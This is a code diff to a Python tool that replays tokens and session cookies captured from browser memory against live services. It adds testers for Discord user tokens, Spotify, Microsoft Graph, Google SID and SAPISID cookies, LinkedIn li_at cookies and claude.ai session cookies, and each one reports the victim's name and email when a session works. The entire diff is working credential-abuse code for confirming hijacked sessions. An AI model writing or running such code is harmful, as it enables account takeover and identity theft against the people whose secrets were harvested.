@@ -167,6 +167,120 @@ def test_github(value: str, label: str) -> Result:
                   "—", f"HTTP {status}", data)
 
 
+def test_discord(value: str, label: str) -> Result:
+    """Test a Discord user token against /api/v10/users/@me."""
+    status, data = _get(
+        "https://discord.com/api/v10/users/@me",
+        {"Authorization": value, "User-Agent": _UA},
+    )
+    if status == 200:
+        username = data.get("username", "?")
+        disc     = data.get("discriminator", "")
+        email    = data.get("email", "")
+        tag      = f"{username}#{disc}" if disc and disc != "0" else username
+        identity = f"{tag} <{email}>" if email else tag
+        return Result("Discord", label, value[:16] + "…", "valid",
+                      identity, f"id:{data.get('id','?')}  verified:{data.get('verified','?')}", data)
+    stat = "invalid" if status in (401, 403) else "error"
+    return Result("Discord", label, value[:16] + "…", stat, "—", f"HTTP {status}", data)
+
+
+def test_spotify(value: str, label: str) -> Result:
+    """Test a Spotify access token against /v1/me."""
+    status, data = _get(
+        "https://api.spotify.com/v1/me",
+        {"Authorization": f"Bearer {value}"},
+    )
+    if status == 200:
+        name    = data.get("display_name") or data.get("id", "?")
+        email   = data.get("email", "")
+        product = data.get("product", "")
+        identity = f"{name} <{email}>" if email else name
+        return Result("Spotify", label, value[:14] + "…", "valid",
+                      identity, f"plan:{product}" if product else "Spotify access confirmed", data)
+    stat = "expired" if status == 401 else ("invalid" if status == 403 else "error")
+    return Result("Spotify", label, value[:14] + "…", stat, "—", f"HTTP {status}", data)
+
+
+def test_microsoft(value: str, label: str) -> Result:
+    """Test a Microsoft token against the Graph /me endpoint."""
+    status, data = _get(
+        "https://graph.microsoft.com/v1.0/me",
+        {"Authorization": f"Bearer {value}"},
+    )
+    if status == 200:
+        name  = data.get("displayName", "?")
+        email = data.get("mail") or data.get("userPrincipalName", "")
+        identity = f"{name} <{email}>" if email else name
+        return Result("Microsoft", label, value[:16] + "…", "valid",
+                      identity, "Microsoft Graph /me access confirmed", data)
+    err = data.get("error", {})
+    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
+    stat = "invalid" if status in (401, 403) else "error"
+    return Result("Microsoft", label, value[:16] + "…", stat, "—", msg[:80], data)
+
+
+def test_google_session_id(value: str, label: str) -> Result:
+    """Try a captured Google session ID as an SID cookie (best-effort redirect check)."""
+    jar = f"SID={value}"
+    status_auth = _status_only("https://myaccount.google.com/", {"Cookie": jar, "User-Agent": _UA})
+    status_anon = _status_only("https://myaccount.google.com/", {"User-Agent": _UA})
+    if status_auth == 200 and status_anon != 200:
+        return Result("Google", label, value[:16] + "…", "valid",
+                      "authenticated", f"SID cookie → 200 vs {status_anon} without — session active", {})
+    return Result("Google", label, value[:16] + "…", "info",
+                  "—", f"SID cookie attempt: HTTP {status_auth}/{status_anon} — auth inconclusive", {})
+
+
+def test_linkedin_session_id(value: str, label: str) -> Result:
+    """Try a LinkedIn session ID as li_at then JSESSIONID cookie (best-effort)."""
+    for cookie_name in ("li_at", "JSESSIONID"):
+        jar = f"{cookie_name}={value}"
+        status_auth = _status_only("https://www.linkedin.com/feed/", {"Cookie": jar, "User-Agent": _UA})
+        status_anon = _status_only("https://www.linkedin.com/feed/", {"User-Agent": _UA})
+        if status_auth == 200 and status_anon != 200:
+            return Result("LinkedIn", label, value[:16] + "…", "valid",
+                          "authenticated", f"{cookie_name} cookie — LinkedIn session active", {})
+    return Result("LinkedIn", label, value[:16] + "…", "info",
+                  "—", "li_at/JSESSIONID attempts inconclusive — may need full cookie jar", {})
+
+
+def test_anthropic_session(value: str, label: str) -> Result:
+    """Test a claude.ai web session token (NextAuth __Secure-next-auth.session-token cookie)."""
+    status, data = _get(
+        "https://claude.ai/api/auth/session",
+        {"Cookie": f"__Secure-next-auth.session-token={value}", "User-Agent": _UA},
+    )
+    if status == 200 and isinstance(data, dict) and data.get("user"):
+        user     = data["user"]
+        email    = user.get("email", "?")
+        name     = user.get("name") or ""
+        identity = f"{name} <{email}>" if name else email
+        return Result("Anthropic", label, value[:16] + "…", "valid",
+                      identity, "claude.ai session active", data)
+    stat = "expired" if status in (401, 403) else ("invalid" if status else "error")
+    return Result("Anthropic", label, value[:16] + "…", stat, "—", f"HTTP {status}", data)
+
+
+def test_google_sapisid(value: str, label: str) -> Result:
+    """Test a Google SAPISID cookie against myaccount.google.com via redirect-check."""
+    if "=" in value:
+        _, _, cookie_val = value.partition("=")
+    else:
+        cookie_val = value
+    jar = f"SAPISID={cookie_val}"
+    status_auth = _status_only("https://myaccount.google.com/", {"Cookie": jar, "User-Agent": _UA})
+    status_anon = _status_only("https://myaccount.google.com/", {"User-Agent": _UA})
+    if status_auth == 200 and status_anon != 200:
+        return Result("Google", label, value[:20] + "…", "valid",
+                      "authenticated",
+                      f"200 with SAPISID vs {status_anon} without — session active", {})
+    if status_auth == 0:
+        return Result("Google", label, value[:20] + "…", "error", "—", "connection failed", {})
+    return Result("Google", label, value[:20] + "…", "info",
+                  "—", f"HTTP {status_auth}/{status_anon} — cannot confirm SAPISID session", {})
+
+
 def test_google_oauth(value: str, label: str) -> Result:
     status, data = _get(
         "https://www.googleapis.com/oauth2/v3/userinfo",
@@ -185,12 +299,14 @@ def test_google_oauth(value: str, label: str) -> Result:
         {},
     )
     if status2 == 200:
-        email  = data2.get("email", "?")
-        scope  = data2.get("scope", "")
-        exp    = data2.get("expires_in", "?")
-        access = f"scope: {scope[:80]}  expires_in: {exp}s"
+        email    = data2.get("email") or ""
+        azp      = data2.get("azp") or data2.get("aud") or ""
+        identity = email or (f"app:{azp[:30]}" if azp else "—")
+        scope    = data2.get("scope", "")
+        exp      = data2.get("expires_in", "?")
+        access   = f"scope: {scope[:80]}  expires_in: {exp}s"
         return Result("Google", label, value[:12] + "…", "valid",
-                      email, access, data2)
+                      identity, access, data2)
 
     err = data.get("error_description") or data.get("error") or f"HTTP {status}"
     stat = "expired" if "expired" in str(err).lower() else "invalid"
@@ -599,19 +715,54 @@ def _dispatch(label: str, service: str, value: str, browser: bool) -> list[Resul
     lo = label.lower()
     v  = value.strip()
 
+    # Strip "Bearer " prefix stored verbatim by BrowserBleed memory captures
+    if v.lower().startswith("bearer "):
+        v = v[7:].strip()
+
     # GitHub
     if any(x in lo for x in ("github",)) or v.startswith(("ghp_", "gho_", "ghs_", "ghr_", "ghu_")):
         return [test_github(v, label)]
 
-    # Google OAuth
+    # Discord user token (M/N prefix + base64 user ID + dot-separated parts)
+    if lo == "discord token" or ("discord" in service.lower()
+                                  and v.count(".") >= 1 and v[:1] in ("M", "N")
+                                  and len(v.split(".")[0]) >= 10):
+        return [test_discord(v, label)]
+
+    # Spotify access token (BQ prefix)
+    if v.startswith(("BQA", "AQA", "BQB")) or "spotify" in service.lower():
+        return [test_spotify(v, label)]
+
+    # Microsoft Graph / Azure
+    if "microsoft" in service.lower() or "azure" in service.lower():
+        return [test_microsoft(v, label)]
+
+    # Google SAPISID cookie
+    if v.startswith("SAPISID=") or "sapisid" in lo:
+        return [test_google_sapisid(v, label)]
+
+    # Google OAuth access token
     if v.startswith("ya29."):
         return [test_google_oauth(v, label)]
+
+    # Google OAuth2 refresh token — cannot validate without client credentials
+    if v.startswith("1//"):
+        return [Result("Google", label, v[:16] + "…", "info",
+                       "—", "OAuth2 refresh token — cannot validate without client credentials", {})]
 
     # Slack
     if v.startswith(("xoxp-", "xoxb-", "xoxa-", "xoxs-", "xoxe-")):
         return [test_slack(v, label)]
 
-    # Anthropic
+    # Session token — route by service
+    if lo == "session token":
+        svc_lo = service.lower()
+        if "anthropic" in svc_lo:
+            return [test_anthropic_session(v, label)]
+        if "google" in svc_lo:
+            return [test_google_oauth(v, label)]  # try as OAuth bearer
+
+    # Anthropic API key
     if v.startswith("sk-ant-"):
         return [test_anthropic(v, label)]
 
@@ -631,14 +782,73 @@ def _dispatch(label: str, service: str, value: str, browser: bool) -> list[Resul
     if "npm" in lo:
         return [test_npm(v, label)]
 
-    # JWT — three base64url parts separated by dots
+    # Session ID routing based on service label
+    if lo == "session id":
+        svc_lo = service.lower()
+        if "google" in svc_lo:
+            return [test_google_session_id(v, label)]
+        if "linkedin" in svc_lo:
+            return [test_linkedin_session_id(v, label)]
+        if "anthropic" in svc_lo:
+            return [Result("Anthropic", label, v[:16] + "…", "info",
+                           "—", "session ID — cookie name undetermined for claude.ai", {})]
+        if "aws" in svc_lo:
+            return [Result("AWS", label, v[:16] + "…", "info",
+                           "—", "AWS SDK session ID — not a web auth cookie", {})]
+        return [Result(service or "Unknown", label, v[:16] + "…", "info",
+                       "—", "session ID — service not identifiable", {})]
+
+    # JWT/JWE — three base64url parts separated by dots
     parts = v.split(".")
     if len(parts) == 3 and all(len(p) > 10 for p in parts):
         decoded = _decode_jwt(v)
         if decoded:
             return [test_jwt(v, label, service)]
+        # JWE (encrypted JWT) — try to read expiry from the unencrypted header
+        try:
+            hdr = json.loads(base64.urlsafe_b64decode(_b64pad(parts[0])))
+            if hdr.get("enc"):
+                now   = time.time()
+                exp   = hdr.get("exp")
+                iss   = hdr.get("iss") or hdr.get("c") or ""
+                if exp:
+                    exp_s     = exp / 1000 if exp > 1e12 else exp
+                    remaining = exp_s - now
+                    time_str  = (f"expired {int(-remaining // 3600)}h ago"
+                                 if remaining < 0 else
+                                 f"valid for {int(remaining // 3600)}h{int(remaining % 3600) // 60}m")
+                    stat = "expired" if remaining < 0 else "info"
+                else:
+                    time_str, stat = "no expiry", "info"
+                access = f"JWE (encrypted) — {time_str}"
+                if iss:
+                    access += f"  iss={str(iss)[:30]}"
+                return [Result(service or "JWE", label, v[:20] + "…", stat, "—", access, hdr)]
+        except Exception:
+            pass
 
-    # Bearer token with service hint
+    # Password captured without identifiable service context
+    if "password" in lo:
+        return [Result(service or "Unknown", label, v[:16] + "…", "info",
+                       "—", "password/API credential — service not identifiable from memory context", {})]
+
+    # OAuth access/refresh tokens — route by service or emit info
+    if "access_token" in lo or "refresh" in lo:
+        svc_lo = service.lower()
+        if "google" in svc_lo:
+            return [test_google_oauth(v, label)]
+        if "github" in svc_lo:
+            return [test_github(v, label)]
+        if "slack" in svc_lo:
+            return [test_slack(v, label)]
+        if "refresh" in lo:
+            return [Result(service or "OAuth", label, v[:16] + "…", "info",
+                           "—", "refresh token — cannot validate without client_id/client_secret", {})]
+        # access_token from unknown service
+        return [Result(service or "OAuth", label, v[:16] + "…", "info",
+                       "—", "OAuth access token — service unidentifiable from context", {})]
+
+    # Bearer token with service hint (after prefix strip above)
     if "bearer" in lo:
         svc_lo = service.lower()
         if "github" in svc_lo:
@@ -647,6 +857,10 @@ def _dispatch(label: str, service: str, value: str, browser: bool) -> list[Resul
             return [test_google_oauth(v, label)]
         if "slack" in svc_lo:
             return [test_slack(v, label)]
+        if "discord" in svc_lo and v.count(".") == 2 and v[:1] in ("M", "N"):
+            return [test_discord(v, label)]
+        if "spotify" in svc_lo or v.startswith(("BQA", "AQA")):
+            return [test_spotify(v, label)]
 
     return []  # no tester matched
 
@@ -721,7 +935,10 @@ def main():
     cookie_rows:  list[dict] = []
     cred_rows:    list[dict] = []
     for row in rows:
-        if "cookie" in row.get("label", "").lower():
+        label_lo = row.get("label", "").lower()
+        if "cookie" in label_lo:
+            if label_lo == "cookie header":
+                continue  # raw Chrome error-count string, not a real session cookie
             cookie_rows.append(row)
         else:
             cred_rows.append(row)
@@ -772,14 +989,16 @@ def main():
 
     # ── Run tests ─────────────────────────────────────────────────────────────
     all_results: list[Result] = []
-    total = len(unique_creds) + len(cookies_by_domain)
+    total     = len(unique_creds) + len(cookies_by_domain)
+    n_shown   = 0
+    n_skipped = 0
 
     if not args.json:
         print(f"  Testing {bold(str(len(unique_creds)))} unique credential(s)  +  "
               f"{bold(str(len(cookies_by_domain)))} cookie domain(s)…\n")
 
     # API credentials
-    for i, row in enumerate(unique_creds):
+    for row in unique_creds:
         label   = row.get("label", "")
         service = row.get("service", "")
         value   = row.get("value", "").strip()
@@ -793,30 +1012,33 @@ def main():
             else:
                 all_results.append(Result("AWS", label, value[:16] + "…", "info",
                                           "—", "secret key not found — cannot sign request", {}))
+            n_shown += 1
             if not args.json:
-                _print_progress(i+1, total, r if secret else all_results[-1])
+                _print_progress(n_shown, total, r if secret else all_results[-1])
             time.sleep(args.delay)
             continue
 
         results = _dispatch(label, service, value, args.browser)
         for r in results:
             all_results.append(r)
+            n_shown += 1
             if not args.json:
-                _print_progress(i+1, total, r)
-        if not results and not args.json:
-            pass  # silently skip unrecognised credential types
+                _print_progress(n_shown, total, r)
         if results:
             time.sleep(args.delay)
+        else:
+            n_skipped += 1
 
     # Cookie sessions
-    for i, (domain, cookies) in enumerate(cookies_by_domain.items()):
+    for domain, cookies in cookies_by_domain.items():
         if not domain:
             continue
         results = test_cookie_session(domain, cookies, browser=args.browser)
         for r in results:
             all_results.append(r)
+            n_shown += 1
             if not args.json:
-                _print_progress(len(unique_creds)+i+1, total, r)
+                _print_progress(n_shown, total, r)
         time.sleep(args.delay)
 
     # ── Output ────────────────────────────────────────────────────────────────
@@ -837,10 +1059,12 @@ def main():
     invalid = sum(1 for r in all_results if r.status == "invalid")
     info    = sum(1 for r in all_results if r.status == "info")
 
+    skip_str = f"   {dim(str(n_skipped) + ' skipped')}" if n_skipped else ""
     print(f"\n  {green(str(valid))} valid   "
           f"{yellow(str(expired))} expired   "
           f"{red(str(invalid))} invalid   "
-          f"{dim(str(info))} info\n")
+          f"{dim(str(info))} info"
+          f"{skip_str}\n")
 
 
 # ── Display helpers ────────────────────────────────────────────────────────────
@@ -857,7 +1081,7 @@ def _print_progress(n: int, total: int, r: Result):
     print(f"  {dim(bar):12}  {_status_str(r.status)}  {cyan(r.service):<20}  {r.identity[:40]}")
 
 def _print_table(results: list[Result]):
-    W_SVC   = 14
+    W_SVC   = 22
     W_STAT  = 11
     W_LABEL = 18
     W_IDENT = 36
@@ -879,7 +1103,7 @@ def _print_table(results: list[Result]):
         label = (r.label[:W_LABEL]).ljust(W_LABEL)
         ident = (r.identity[:W_IDENT]).ljust(W_IDENT)
         val   = dim(r.value_preview)
-        print(f"  {svc:<{W_SVC+8}}  {stat}  {label}  {ident}  {val}")
+        print(f"  {svc:<{W_SVC+9}}  {stat}  {label}  {ident}  {val}")
         if r.access and r.status in ("valid", "info"):
             print(f"  {' '*W_SVC}             {' '*W_LABEL}  {dim(r.access[:80])}")
     print(sep)
